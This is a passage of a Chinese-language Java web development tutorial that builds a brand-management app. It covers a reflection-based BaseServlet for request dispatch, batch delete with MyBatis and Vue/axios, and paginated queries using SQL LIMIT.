                <span class="hljs-title function_">axios</span>(&#123;
                    <span class="hljs-attr">method</span>: <span class="hljs-string">&#x27;post&#x27;</span>,
                    <span class="hljs-attr">url</span>: <span class="hljs-string">&#x27;http://localhost:8080/brand-case/brand/add&#x27;</span>,
                    <span class="hljs-attr">data</span>: brand = _this.<span class="hljs-property">brand</span>
                &#125;).<span class="hljs-title function_">then</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params">response</span>)&#123;
                    <span class="hljs-keyword">if</span>(response.<span class="hljs-property">data</span> == <span class="hljs-string">&quot;success&quot;</span>)&#123;
                    	<span class="hljs-comment">// 隐藏对话框</span>
                        _this.<span class="hljs-property">dialogVisible</span> = <span class="hljs-literal">false</span>;
                        <span class="hljs-comment">// 重新加载全部数据</span>
                        _this.<span class="hljs-title function_">selectAll</span>();
                        _this.<span class="hljs-title function_">msgbox</span>(<span class="hljs-string">&quot;添加成功！&quot;</span>);
                    &#125;
                &#125;)
            &#125;</code></pre>



<h3 id="Servlet优化"><a href="#Servlet优化" class="headerlink" title="Servlet优化"></a>Servlet优化</h3><p>&#x3D;&#x3D;&#x3D;Web 层的 Servlet 个数太多了，不利于管理和编写&#x3D;&#x3D;&#x3D;</p>
<p>通过之前的两个功能，我们发现每一个功能都需要定义一个 <code>servlet</code>，一个模块需要实现增删改查功能，就需要4个 <code>servlet</code>，模块一多就会造成<code>servlet</code> 泛滥。此时我们就想 <code>servlet</code> 能不能像 <code>service</code> 一样，一个模块只定义一个 <code>servlet</code>，而每一个功能只需要在该 <code>servlet</code> 中定义对应的方法。例如下面代码：</p>
<pre><code class="hljs java"><span class="hljs-meta">@WebServlet(&quot;/brand/*&quot;)</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">BrandServlet</span> &#123;
    <span class="hljs-comment">//查询所有</span>
	<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">selectAll</span><span class="hljs-params">(...)</span> &#123;&#125;
    
    <span class="hljs-comment">//添加数据</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">add</span><span class="hljs-params">(...)</span> &#123;&#125;
    
     <span class="hljs-comment">//修改数据</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">update</span><span class="hljs-params">(...)</span> &#123;&#125;
    
    <span class="hljs-comment">//删除删除</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">delete</span><span class="hljs-params">(...)</span> &#123;&#125;
&#125;</code></pre>

<p>而我们知道发送请求 <code>servlet</code>，<code>tomcat</code> 会自动的调用 <code>service()</code> 方法，之前我们在自定义的 <code>servlet</code> 中重写 <code>doGet()</code> 方法和 <code>doPost()</code> 方法，当我们访问该 <code>servlet</code> 时会根据请求方式将请求分发给 <code>doGet()</code> 或者 <code>doPost()</code>  方法</p>
<img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20210826184103210.png" alt="image-20210826184103210" style="zoom:80%;">

<p>那么我们也可以仿照这样请求分发的思想，在 <code>service()</code> 方法中根据具体的操作调用对应的方法，如：查询所有就调用 <code>selectAll()</code> 方法，添加企业信息就调用 <code>add()</code> 方法。</p>
<p>为了做到通用，我们定义一个通用的 <code>servlet</code> 类，在定义其他的 <code>servlet</code> 是不需要继承 <code>HttpServlet</code>，而继承我们定义的 <code>BaseServlet</code>，在<code> BaseServlet</code> 中调用具体 <code>servlet</code>（如<code>BrandServlet</code>）中的对应方法。</p>
<pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">BaseServlet</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">HttpServlet</span> &#123;
    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">service</span><span class="hljs-params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="hljs-keyword">throws</span> ServletException, IOException &#123;
        <span class="hljs-comment">//进行请求的分发</span>
    &#125;
&#125;</code></pre>

<p><code>BrandServlet</code> 定义就需要修改为如下：</p>
<pre><code class="hljs java"><span class="hljs-meta">@WebServlet(&quot;/brand/*&quot;)</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">BrandServlet</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">BaseServlet</span> &#123;
    <span class="hljs-comment">//用户实现分页查询</span>
	<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">selectAll</span><span class="hljs-params">(...)</span> &#123;&#125; 
    
    <span class="hljs-comment">//添加企业信息</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">add</span><span class="hljs-params">(...)</span> &#123;&#125;
    
    <span class="hljs-comment">//修改企业信息</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">update</span><span class="hljs-params">(...)</span> &#123;&#125;
    
    <span class="hljs-comment">//删除企业信息</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">delete</span><span class="hljs-params">(...)</span> &#123;&#125;
&#125;</code></pre>

<p>那么如何在 <code>BaseServlet</code> 中调用对应的方法呢？比如查询所有就调用 <code>selectAll()</code> 方法。</p>
<p>可以&#x3D;&#x3D;规定在发送请求时，请求资源的二级路径（&#x2F;brandServlet&#x2F;selectAll）和需要调用的方法名相同&#x3D;&#x3D;，如：</p>
<p>查询所有数据的路径以后就需要写成： <code>http://localhost:8080/brand-case/brandServlet/selectAll</code></p>
<p>添加数据的路径以后就需要写成： <code>http://localhost:8080/brand-case/brandServlet/add</code></p>
<p>修改数据的路径以后就需要写成： <code>http://localhost:8080/brand-case/brandServlet/update</code></p>
<p>删除数据的路径以后就需要写成： <code>http://localhost:8080/brand-case/brandServlet/delete</code></p>
<p>这样的话，在 <code>BaseServlet</code> 中就需要获取到资源的二级路径作为方法名，然后调用该方法</p>
<pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">BaseServlet</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">HttpServlet</span> &#123;
    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">service</span><span class="hljs-params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="hljs-keyword">throws</span> ServletException, IOException &#123;
        <span class="hljs-comment">//1. 获取请求路径</span>
        <span class="hljs-type">String</span> <span class="hljs-variable">uri</span> <span class="hljs-operator">=</span> req.getRequestURI(); <span class="hljs-comment">// 例如路径为：/brand-case/brand/selectAll</span>
        <span class="hljs-comment">//2. 获取最后一段路径，方法名</span>
        <span class="hljs-type">int</span> <span class="hljs-variable">index</span> <span class="hljs-operator">=</span> uri.lastIndexOf(<span class="hljs-string">&#x27;/&#x27;</span>);
        <span class="hljs-type">String</span> <span class="hljs-variable">methodName</span> <span class="hljs-operator">=</span> uri.substring(index + <span class="hljs-number">1</span>); <span class="hljs-comment">//  获取到资源的二级路径  selectAll</span>

        <span class="hljs-comment">//2. 执行方法</span>
        <span class="hljs-comment">//2.1 获取BrandServlet /UserServlet 字节码对象 Class</span>
        <span class="hljs-comment">//System.out.println(this);</span>

        Class&lt;? <span class="hljs-keyword">extends</span> <span class="hljs-title class_">BaseServlet</span>&gt; cls = <span class="hljs-built_in">this</span>.getClass();
        <span class="hljs-comment">//2.2 获取方法 Method对象</span>
        <span class="hljs-keyword">try</span> &#123;
            <span class="hljs-type">Method</span> <span class="hljs-variable">method</span> <span class="hljs-operator">=</span> cls.getMethod(methodName,？？？);
            <span class="hljs-comment">//4,调用该方法</span>
            method.invoke(<span class="hljs-built_in">this</span>,？？？);
        &#125; <span class="hljs-keyword">catch</span> (NoSuchMethodException e) &#123;
            e.printStackTrace();
        &#125; <span class="hljs-keyword">catch</span> (IllegalAccessException e) &#123;
            e.printStackTrace();
        &#125; <span class="hljs-keyword">catch</span> (InvocationTargetException e) &#123;
            e.printStackTrace();
        &#125;
    &#125;
&#125;</code></pre>

<p>通过上面代码发现根据方法名获取对应方法的 <code>Method</code> 对象时需要指定方法参数的字节码对象。解决这个问题，可以将方法的参数类型规定死，而方法中可能需要用到 <code>request</code> 对象和 <code>response</code> 对象，所以指定方法的参数为 <code>HttpServletRequest</code> 和 <code>HttpServletResponse</code>，那么 <code>BrandServlet</code> 代码就可以改进为：</p>
<pre><code class="hljs java"><span class="hljs-meta">@WebServlet(&quot;/brand/*&quot;)</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">BrandServlet</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">BaseServlet</span> &#123;
    <span class="hljs-comment">//用户实现分页查询</span>
	<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">selectAll</span><span class="hljs-params">(HttpServletRequest req, HttpServletResponse resp)</span> &#123;&#125;
    
    <span class="hljs-comment">//添加企业信息</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">add</span><span class="hljs-params">(HttpServletRequest req, HttpServletResponse resp)</span> &#123;&#125;
    
    <span class="hljs-comment">//修改企业信息</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">update</span><span class="hljs-params">(HttpServletRequest req, HttpServletResponse resp)</span> &#123;&#125;
    
    <span class="hljs-comment">//删除企业信息</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">delete</span><span class="hljs-params">(HttpServletRequest req, HttpServletResponse resp)</span> &#123;&#125;
&#125;</code></pre>

<p>BaseServlet代码可以改进为：</p>
<pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">BaseServlet</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">HttpServlet</span> &#123;

    <span class="hljs-comment">//根据请求的最后一段路径来进行方法分发</span>
    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">service</span><span class="hljs-params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="hljs-keyword">throws</span> ServletException, IOException &#123;
        <span class="hljs-comment">//1. 获取请求路径</span>
        <span class="hljs-type">String</span> <span class="hljs-variable">uri</span> <span class="hljs-operator">=</span> req.getRequestURI(); <span class="hljs-comment">// 例如路径为：/brand-case/brand/selectAll</span>
        <span class="hljs-comment">//2. 获取最后一段路径，方法名</span>
        <span class="hljs-type">int</span> <span class="hljs-variable">index</span> <span class="hljs-operator">=</span> uri.lastIndexOf(<span class="hljs-string">&#x27;/&#x27;</span>);
        <span class="hljs-type">String</span> <span class="hljs-variable">methodName</span> <span class="hljs-operator">=</span> uri.substring(index + <span class="hljs-number">1</span>); <span class="hljs-comment">//  获取到资源的二级路径  selectAll   </span>

        <span class="hljs-comment">//2. 执行方法</span>
        <span class="hljs-comment">//2.1 获取BrandServlet /UserServlet 字节码对象 Class</span>
        <span class="hljs-comment">//System.out.println(this);</span>

        Class&lt;? <span class="hljs-keyword">extends</span> <span class="hljs-title class_">BaseServlet</span>&gt; cls = <span class="hljs-built_in">this</span>.getClass();
        <span class="hljs-comment">//2.2 获取方法 Method对象</span>
        <span class="hljs-keyword">try</span> &#123;   
            <span class="hljs-type">Method</span> <span class="hljs-variable">method</span> <span class="hljs-operator">=</span> cls.getMethod(methodName, HttpServletRequest.class, HttpServletResponse.class);
            <span class="hljs-comment">//2.3 执行方法</span>
            method.invoke(<span class="hljs-built_in">this</span>,req,resp);
        &#125; <span class="hljs-keyword">catch</span> (NoSuchMethodException e) &#123;
            e.printStackTrace();
        &#125; <span class="hljs-keyword">catch</span> (IllegalAccessException e) &#123;
            e.printStackTrace();
        &#125; <span class="hljs-keyword">catch</span> (InvocationTargetException e) &#123;
            e.printStackTrace();
        &#125;
    &#125;
&#125;</code></pre>

<p>前端需要改只有几个访问路径，这里不做具体实现</p>
<h3 id="3-批量删除"><a href="#3-批量删除" class="headerlink" title="3.批量删除"></a>3.批量删除</h3><h4 id="需求分析-2"><a href="#需求分析-2" class="headerlink" title="需求分析"></a>需求分析</h4><ul>
<li>批量删除请求，携带参数为<code>[1,2,3...]</code>类型的json字符串</li>
<li>后端接收到json字符串后需要将其转为int数组</li>
<li>调用BrandService中的方法删除数据</li>
</ul>
<h4 id="后端实现-2"><a href="#后端实现-2" class="headerlink" title="后端实现"></a>后端实现</h4><h5 id="dao-2"><a href="#dao-2" class="headerlink" title="dao"></a>dao</h5><p><code>BrandMapper</code>中添加<code>deleteByIds()</code>方法</p>
<pre><code class="hljs java"><span class="hljs-comment">/**</span>
<span class="hljs-comment"> * 批量删除</span>
<span class="hljs-comment"> * <span class="hljs-doctag">@param</span> ids</span>
<span class="hljs-comment"> */</span>
<span class="hljs-keyword">void</span> <span class="hljs-title function_">deleteByIds</span><span class="hljs-params">(<span class="hljs-meta">@Param(&quot;ids&quot;)</span> <span class="hljs-type">int</span>[] ids)</span>;</code></pre>

<h5 id="service-2"><a href="#service-2" class="headerlink" title="service"></a>service</h5><p>在<code>BrandService</code>中实现批量删除的业务逻辑代码</p>
<pre><code class="hljs java"><span class="hljs-comment">/**</span>
<span class="hljs-comment"> * 批量删除</span>
<span class="hljs-comment"> * <span class="hljs-doctag">@param</span> ids</span>
<span class="hljs-comment"> */</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">deleteByIds</span><span class="hljs-params">(<span class="hljs-type">int</span>[] ids)</span>&#123;
    <span class="hljs-type">SqlSession</span> <span class="hljs-variable">sqlSession</span> <span class="hljs-operator">=</span> sqlSessionFactory.openSession();
    <span class="hljs-type">BrandMapper</span> <span class="hljs-variable">mapper</span> <span class="hljs-operator">=</span> sqlSession.getMapper(BrandMapper.class);
    mapper.deleteByIds(ids);
    sqlSession.commit();
    sqlSession.close();

&#125;</code></pre>

<h5 id="servlet-2"><a href="#servlet-2" class="headerlink" title="servlet"></a>servlet</h5><p><code>src/main/java/com/itheima/web/servlet</code>的<code>BrandServlet</code>添加<code>deleteByIds</code>方法</p>
<pre><code class="hljs java"><span class="hljs-comment">/**</span>
<span class="hljs-comment"> * 批量删除操作</span>
<span class="hljs-comment"> * <span class="hljs-doctag">@param</span> request</span>
<span class="hljs-comment"> * <span class="hljs-doctag">@param</span> response</span>
<span class="hljs-comment"> * <span class="hljs-doctag">@throws</span> ServletException</span>
<span class="hljs-comment"> * <span class="hljs-doctag">@throws</span> IOException</span>
<span class="hljs-comment"> */</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">deleteByIds</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="hljs-keyword">throws</span> ServletException, IOException &#123;

    <span class="hljs-type">BufferedReader</span> <span class="hljs-variable">reader</span> <span class="hljs-operator">=</span> request.getReader();
    <span class="hljs-comment">// 获取json字符串</span>
    <span class="hljs-type">String</span> <span class="hljs-variable">line</span> <span class="hljs-operator">=</span> reader.readLine();
    System.out.println(line);
    <span class="hljs-type">int</span>[] ids = JSON.parseObject(line, <span class="hljs-type">int</span>[].class);
    System.out.println(ids);

    service.deleteByIds(ids);
    response.getWriter().write(<span class="hljs-string">&quot;success&quot;</span>);

&#125;</code></pre>

<h4 id="前端实现-2"><a href="#前端实现-2" class="headerlink" title="前端实现"></a>前端实现</h4><h5 id="获取选中数据的id值"><a href="#获取选中数据的id值" class="headerlink" title="获取选中数据的id值"></a>获取选中数据的id值</h5><p><code>handleSelectionChange</code></p>
<pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">el-table</span></span>
<span class="hljs-tag">                <span class="hljs-attr">:data</span>=<span class="hljs-string">&quot;brandlist&quot;</span></span>
<span class="hljs-tag">                <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;width: 100%&quot;</span></span>
<span class="hljs-tag">                <span class="hljs-attr">:row-class-name</span>=<span class="hljs-string">&quot;tableRowClassName&quot;</span></span>
<span class="hljs-tag">                @<span class="hljs-attr">selection-change</span>=<span class="hljs-string">&quot;handleSelectionChange&quot;</span></span>
<span class="hljs-tag">        &gt;</span></code></pre>

<p>可以看到当数据被选中后，<code>multipleSelection</code>会存放被选择的数据对象</p>
<pre><code class="hljs js"><span class="hljs-comment">// 复选框选中后执行的方法</span>
            <span class="hljs-title function_">handleSelectionChange</span>(<span class="hljs-params">val</span>) &#123;
                <span class="hljs-variable language_">this</span>.<span class="hljs-property">multipleSelection</span> = val;

                <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">multipleSelection</span>)
                <span class="hljs-comment">// console.log(this.multipleSelection)</span>
            &#125;,</code></pre>

<p>而我们所需要的只是对象的id值，因此需要遍历<code>multipleSelection</code>获取id值</p>
<pre><code class="hljs js"><span class="hljs-comment">// 从_this.multipleSelection获取brand的id值</span>
                    <span class="hljs-keyword">for</span>(<span class="hljs-keyword">let</span> i=<span class="hljs-number">0</span>; i&lt;_this.<span class="hljs-property">multipleSelection</span>.<span class="hljs-property">length</span>;i++)&#123;
                        <span class="hljs-keyword">let</span> selectItem = _this.<span class="hljs-property">multipleSelection</span>[i];
                        _this.<span class="hljs-property">selectedIds</span>[i] = selectItem.<span class="hljs-property">id</span>;
                    &#125;</code></pre>

<h5 id="批量删除提示"><a href="#批量删除提示" class="headerlink" title="批量删除提示"></a>批量删除提示</h5><p>删除操作一般比较危险因此需要让用户确认是否删除，在element-ui中找到<code>$confirm</code>组件实现该功能</p>
<pre><code class="hljs js"><span class="hljs-title function_">deleteByIds</span>(<span class="hljs-params"></span>)&#123;
              <span class="hljs-variable language_">this</span>.$confirm(<span class="hljs-string">&#x27;确定删除吗？&#x27;</span>, <span class="hljs-string">&#x27;确认信息&#x27;</span>, &#123;
                  <span class="hljs-attr">distinguishCancelAndClose</span>: <span class="hljs-literal">true</span>,
                  <span class="hljs-attr">confirmButtonText</span>: <span class="hljs-string">&#x27;确定&#x27;</span>,
                  <span class="hljs-attr">cancelButtonText</span>: <span class="hljs-string">&#x27;取消&#x27;</span>
              &#125;).<span class="hljs-title function_">then</span>(<span class="hljs-function">() =&gt;</span> &#123;
                  <span class="hljs-keyword">var</span> _this = <span class="hljs-variable language_">this</span>;
                  <span class="hljs-comment">// 从_this.multipleSelection获取brand的id值</span>
                  <span class="hljs-keyword">for</span>(<span class="hljs-keyword">let</span> i=<span class="hljs-number">0</span>; i&lt;_this.<span class="hljs-property">multipleSelection</span>.<span class="hljs-property">length</span>;i++)&#123;
                      <span class="hljs-keyword">let</span> selectItem = _this.<span class="hljs-property">multipleSelection</span>[i];
                      _this.<span class="hljs-property">selectedIds</span>[i] = selectItem.<span class="hljs-property">id</span>;
                  &#125;
                  <span class="hljs-title function_">axios</span>(&#123;
                      <span class="hljs-attr">method</span>: <span class="hljs-string">&#x27;post&#x27;</span>,
                      <span class="hljs-attr">url</span>:<span class="hljs-string">&quot;http://localhost:8080/brand-case/brand/deleteByIds&quot;</span>,
                      <span class="hljs-attr">data</span>: _this.<span class="hljs-property">selectedIds</span>
                  &#125;).<span class="hljs-title function_">then</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params">response</span>)&#123;
                      <span class="hljs-keyword">if</span>(response.<span class="hljs-property">data</span> == <span class="hljs-string">&quot;success&quot;</span>)&#123;
                          <span class="hljs-comment">// 重新查询数据</span>
                          _this.<span class="hljs-title function_">selectAll</span>();
                          <span class="hljs-comment">//显示提示框</span>
                          _this.$message(&#123;
                              <span class="hljs-attr">type</span>: <span class="hljs-string">&#x27;success&#x27;</span>,
                              <span class="hljs-attr">message</span>: <span class="hljs-string">&#x27;删除成功&#x27;</span>
                          &#125;);
                      &#125;
                  &#125;)
                  &#125;).<span class="hljs-title function_">catch</span>(<span class="hljs-function">() =&gt;</span> &#123;
                      <span class="hljs-variable language_">this</span>.$message(&#123;
                          <span class="hljs-attr">type</span>: <span class="hljs-string">&#x27;info&#x27;</span>,
                          <span class="hljs-attr">message</span>: <span class="hljs-string">&quot;取消删除&quot;</span>
                      &#125;)
              &#125;);
          &#125;</code></pre>





<h3 id="4-分页查询"><a href="#4-分页查询" class="headerlink" title="4.分页查询"></a>4.分页查询</h3><h4 id="需求分析-3"><a href="#需求分析-3" class="headerlink" title="需求分析"></a>需求分析</h4><h5 id="分页查询sql"><a href="#分页查询sql" class="headerlink" title="分页查询sql"></a>分页查询sql</h5><p>分页查询也是从数据库进行查询的，所以我们要分页对应的SQL语句应该怎么写。分页查询使用 <code>LIMIT</code> 关键字，格式为：&#x3D;&#x3D;<code>LIMIT 开始索引 每页显示的条数</code>&#x3D;&#x3D;。以后前端页面在发送请求携带参数时，它并不明确开始索引是什么，但是它知道查询第几页。所以 <code>开始索引</code> 需要在后端进行计算，计算的公式是 ：&#x3D;&#x3D;开始索引 &#x3D; （当前页码 -  1）*  每页显示条数&#x3D;&#x3D;</p>
<p>比如查询第一页的数据的 SQL 语句是：</p>
<pre><code class="hljs n1ql"><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> tb_brand  <span class="hljs-keyword">limit</span> <span class="hljs-number">0</span>,<span class="hljs-number">5</span>;</code></pre>

<p>查询第二页的数据的 SQL 语句是：</p>
<pre><code class="hljs n1ql"><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> tb_brand  <span class="hljs-keyword">limit</span> <span class="hljs-number">5</span>,<span class="hljs-number">5</span>;</code></pre>

<p>查询第三页的数据的 SQL 语句是：</p>
<pre><code class="hljs n1ql"><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> tb_brand  <span class="hljs-keyword">limit</span> <span class="hljs-number">10</span>,<span class="hljs-number">5</span>;</code></pre>

<h5 id="前后端数据分析"><a href="#前后端数据分析" class="headerlink" title="前后端数据分析"></a>前后端数据分析</h5><p>分页查询功能时候比较复杂的，所以我们要先分析清楚以下两个问题：</p>
<ul>
<li><p><strong>前端需要传递什么参数给后端</strong></p>
<p>根据上一步对分页查询 SQL 语句分析得出，前端需要给后端两个参数</p>
<ul>
<li>当前页码 ： currentPage</li>
<li>每页显示条数：pageSize</li>
</ul>
</li>
<li><p><strong>后端需要响应什么数据给前端</strong></p>
<img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20210826231842293.png" alt="image-20210826231842293" style="zoom:80%;">

<p>上图是分页查询页面展示的效果，从上面我们可以看出需要响应以下联股份数据</p>
<ul>
<li>当前页需要展示的数据。我们在后端一般会存储到 List 集合中</li>
<li>总共记录数。在上图页面中需要展示总的记录数，所以这部分数据也需要。总的页面 elementUI 的分页组件会自动计算，我们不需要关心</li>
</ul>
<p>而这两部分需要封装到 PageBean 对象中，并将该对象转换为 json 格式的数据响应回给浏览器</p>
<img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20210826232158234.png" alt="image-20210826232158234" style="zoom:65%;"></li>
</ul>
<p>通过上面的分析我们需要先在 <code>pojo</code> 包下创建 <code>PageBean</code> 类，为了做到通过会将其定义成泛型类，代码如下：</p>
<pre><code class="hljs java"><span class="hljs-comment">//分页查询的JavaBean</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">PageBean</span>&lt;T&gt; &#123;
    <span class="hljs-comment">// 总记录数</span>
    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> totalCount;
    <span class="hljs-comment">// 当前页数据</span>
    <span class="hljs-keyword">private</span> List&lt;T&gt; rows;


    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getTotalCount</span><span class="hljs-params">()</span> &#123;
        <span class="hljs-keyword">return</span> totalCount;
    &#125;

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setTotalCount</span><span class="hljs-params">(<span class="hljs-type">int</span> totalCount)</span> &#123;
        <span class="hljs-built_in">this</span>.totalCount = totalCount;
    &#125;

    <span class="hljs-keyword">public</span> List&lt;T&gt; <span class="hljs-title function_">getRows</span><span class="hljs-params">()</span> &#123;
        <span class="hljs-keyword">return</span> rows;
    &#125;

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setRows</span><span class="hljs-params">(List&lt;T&gt; rows)</span> &#123;
        <span class="hljs-built_in">this</span>.rows = rows;
    &#125;
&#125;</code></pre>

<h4 id="后端实现-3"><a href="#后端实现-3" class="headerlink" title="后端实现"></a>后端实现</h4><h5 id="dao-3"><a href="#dao-3" class="headerlink" title="dao"></a>dao</h5><pre><code class="hljs java"><span class="hljs-comment">/**</span>
<span class="hljs-comment"> * 分页查询</span>
<span class="hljs-comment"> * <span class="hljs-doctag">@param</span> begin</span>
<span class="hljs-comment"> * <span class="hljs-doctag">@param</span> size</span>
<span class="hljs-comment"> * <span class="hljs-doctag">@return</span></span>
<span class="hljs-comment"> */</span>
<span class="hljs-meta">@Select(&quot;select * from tb_brand limit #&#123;begin&#125;, #&#123;size&#125;&quot;)</span>
<span class="hljs-meta">@ResultMap(&quot;brandResultMap&quot;)</span>
List&lt;Brand&gt; <span class="hljs-title function_">selectByPage</span><span class="hljs-params">(<span class="hljs-meta">@Param(&quot;begin&quot;)</span> <span class="hljs-type">int</span> begin, <span class="hljs-meta">@Param(&quot;size&quot;)</span> <span class="hljs-type">int</span> size)</span>;

<span class="hljs-comment">/**</span>
<span class="hljs-comment"> * 查询总记录数</span>
<span class="hljs-comment"> * <span class="hljs-doctag">@return</span></span>
<span class="hljs-comment"> */</span>
<span class="hljs-meta">@Select(&quot;select count(*) from tb_brand&quot;)</span>
<span class="hljs-type">int</span> <span class="hljs-title function_">selectTotalCount</span><span class="hljs-params">()</span>;</code></pre>

<h5 id="service-3"><a href="#service-3" class="headerlink" title="service"></a>service</h5><pre><code class="hljs java">  <span class="hljs-comment">/**</span>
<span class="hljs-comment">   * 分页查询</span>
<span class="hljs-comment">   * <span class="hljs-doctag">@param</span> currentPage</span>
<span class="hljs-comment">   * <span class="hljs-doctag">@param</span> pageSize</span>
<span class="hljs-comment">   * <span class="hljs-doctag">@return</span></span>
<span class="hljs-comment">   */</span>
  <span class="hljs-keyword">public</span> PageBean&lt;Brand&gt; <span class="hljs-title function_">selectByPage</span><span class="hljs-params">(<span class="hljs-type">int</span> currentPage, <span class="hljs-type">int</span> pageSize)</span>&#123;
      <span class="hljs-type">SqlSession</span> <span class="hljs-variable">sqlSession</span> <span class="hljs-operator">=</span> sqlSessionFactory.openSession();
      <span class="hljs-type">BrandMapper</span> <span class="hljs-variable">mapper</span> <span class="hljs-operator">=</span> sqlSession.getMapper(BrandMapper.class);

      <span class="hljs-comment">// 根据公式计算起始值</span>
      <span class="hljs-type">int</span> <span class="hljs-variable">begin</span> <span class="hljs-operator">=</span> (currentPage - <span class="hljs-number">1</span>) * pageSize;
      <span class="hljs-type">int</span> <span class="hljs-variable">size</span> <span class="hljs-operator">=</span> pageSize;
      <span class="hljs-comment">// 获取该页数据</span>
      List&lt;Brand&gt; rows = mapper.selectByPage(begin, size);
<span class="hljs-comment">// 获取总记录数</span>
      <span class="hljs-type">int</span> <span class="hljs-variable">totalCount</span> <span class="hljs-operator">=</span> mapper.selectTotalCount();
<span class="hljs-comment">// 创建PageBean对象</span>
      PageBean&lt;Brand&gt; pageBean = <span class="hljs-keyword">new</span> <span class="hljs-title class_">PageBean</span>&lt;&gt;();
      pageBean.setRows(rows);
      pageBean.setTotalCount(totalCount);

      sqlSession.close();

      <span class="hljs-keyword">return</span> pageBean;

  &#125;</code></pre>

<h5 id="servlet-3"><a href="#servlet-3" class="headerlink" title="servlet"></a>servlet</h5><pre><code class="hljs java">  <span class="hljs-comment">/**</span>
<span class="hljs-comment">   * 分页查询</span>
<span class="hljs-comment">   * <span class="hljs-doctag">@param</span> request</span>
<span class="hljs-comment">   * <span class="hljs-doctag">@param</span> response</span>
<span class="hljs-comment">   * <span class="hljs-doctag">@throws</span> ServletException</span>
<span class="hljs-comment">   * <span class="hljs-doctag">@throws</span> IOException</span>
<span class="hljs-comment">   */</span>
  <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">selectByPage</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="hljs-keyword">throws</span> ServletException, IOException &#123;
      request.setCharacterEncoding(<span class="hljs-string">&quot;utf-8&quot;</span>);
      <span class="hljs-comment">// 1.获取当前页码和每页展示条数 url?currentpage=1&amp;pagesize=5</span>
      <span class="hljs-type">String</span> <span class="hljs-variable">_currentpage</span> <span class="hljs-operator">=</span> request.getParameter(<span class="hljs-string">&quot;currentpage&quot;</span>);
      <span class="hljs-type">String</span> <span class="hljs-variable">_pagesize</span> <span class="hljs-operator">=</span> request.getParameter(<span class="hljs-string">&quot;pagesize&quot;</span>);

      <span class="hljs-type">int</span> <span class="hljs-variable">currentpage</span> <span class="hljs-operator">=</span> Integer.parseInt(_currentpage);
      <span class="hljs-type">int</span> <span class="hljs-variable">pagesize</span> <span class="hljs-operator">=</span> Integer.parseInt(_pagesize);

      <span class="hljs-comment">// 2.转为json</span>
      PageBean&lt;Brand&gt; pageBean = service.selectByPage(currentpage, pagesize);

      <span class="hljs-type">String</span> <span class="hljs-variable">string</span> <span class="hljs-operator">=</span> JSON.toJSONString(pageBean);
<span class="hljs-comment">// 响应数据</span>
      response.setContentType(<span class="hljs-string">&quot;text/json;charset=utf-8&quot;</span>);
      response.getWriter().write(string);

  &#125;</code></pre>

